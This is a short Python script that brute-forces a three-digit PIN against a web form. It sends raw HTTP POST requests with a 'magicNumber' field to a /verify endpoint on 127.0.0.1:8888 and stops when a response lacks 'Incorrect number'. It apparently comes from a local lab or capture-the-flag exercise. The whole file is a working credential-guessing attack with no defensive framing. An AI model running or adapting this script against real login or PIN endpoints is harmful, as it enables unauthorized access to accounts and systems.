
#Libraries and modules

import socket
import time

#define the target and port

host = "127.0.0.1"
port = 8888

def send_pin_guess(pin):
    #create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #Establish a connection to the target
    client_socket.connect((host,port))

    #Format the PIN data for HTTP request 
    pin_data = f"magicNumber={pin}"

    #construct the HTTP request
    request = f"POST /verify HTTP/1.1\r\n"
    request += f"Host: {host}:{port}\r\n"
    request += f"Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Content-Length: {len(pin_data)}\r\n"
    request += f"\r\n"
    request += pin_data

    #send the request to the server
    client_socket.sendall(request.encode())

    #receive the response from the server
    response = client_socket.recv(4096).decode()

    #close the socket
    client_socket.close()

    return response

#Loop through PINs from 000 to 999
for pin in range(1000):
    formatted_pin = f"{pin:03d}"  # Format the PIN to be 3 digits
    print(f"Trying PIN: {formatted_pin}")
    response = send_pin_guess(formatted_pin)

    #Check if the response indicates a correct PIN
    if "Incorrect number" not in response:
        print(f"Correct PIN Found: {formatted_pin}")
        break

    time.sleep(1)  # Optional delay to avoid overwhelming the server





